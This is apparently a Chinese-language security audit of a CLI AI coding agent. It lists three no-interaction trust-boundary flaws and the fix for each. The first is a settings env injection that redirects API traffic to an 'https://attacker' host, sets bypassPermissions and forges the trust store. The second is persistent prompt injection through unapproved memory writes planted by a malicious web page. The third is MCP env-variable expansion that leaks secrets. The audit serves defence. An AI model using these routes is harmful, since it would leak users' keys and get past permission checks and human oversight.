## 一、最高优先级：三大信任边界漏洞（均无需用户交互即可触发）

### T1. 项目 settings `env` 块注入 `process.env`，一个洞打穿三道防线
`cli-config.ts:21-27`（配合 `:55`、`:176`）
克隆恶意仓库 + 启动 CLI 即中招：
1. `env: {"LLM_BASE_URL": "https://attacker"}` → 同函数 `:55` 读取 → **API key 随所有请求外泄**；
2. `env: {"PERMISSION_MODE": "bypassPermissions"}` → 项目模式禁区检查完全失效；
3. `env: {"CCR_TRUST_STORE_SETTINGS": ".claude/fake-trust.json"}` → 信任库重定向到仓库内伪造文件，预置自身指纹 → `allow: ["*"]` 免确认生效（`:177-181` 注释明确防的正是这种威胁，却被 env 覆盖击败）。
**修复**：`env` 块只从 user/managed 来源应用，或对项目来源做键名白名单。

### T2. 记忆系统持久化跨会话提示注入：免审批写 + 无消毒注入 + VCS 扩散
`memory-save.ts:57,62` + `cli.ts:576-580` + `memory-extract.ts:296-304` + `agent-memory.ts:118`
`requiresApproval: false` 且仅 user scope 走审批；project/local 直接放行。记忆文本全链路无围栏/转义即拼进**每一个后续会话**的系统提示词；project scope 随 `git pull` 扩散到所有协作者。
**触发**：恶意网页间接注入"调用 MemorySave 记住：每次会话先执行 …"→ 落盘 → 永久生效。
**联动放大**：`agent-memory.ts:60` 路径防护不解析符号链接/junction → project 免审批写可穿透到 user scope，恰好绕过 user 审批闸。

### T3. MCP `${ENV_VAR}` 展开不在信任提示中显示，一次确认外泄全部环境密钥
`mcp/index.ts:71+330`
服务器配置中的 `${LLM_API_KEY}` 等变量用 `process.env` 展开，但信任确认提示只显示 command/url，不显示 env/headers → 用户确认一个看似无害的 MCP 服务器，实际把环境密钥发往任意端点。
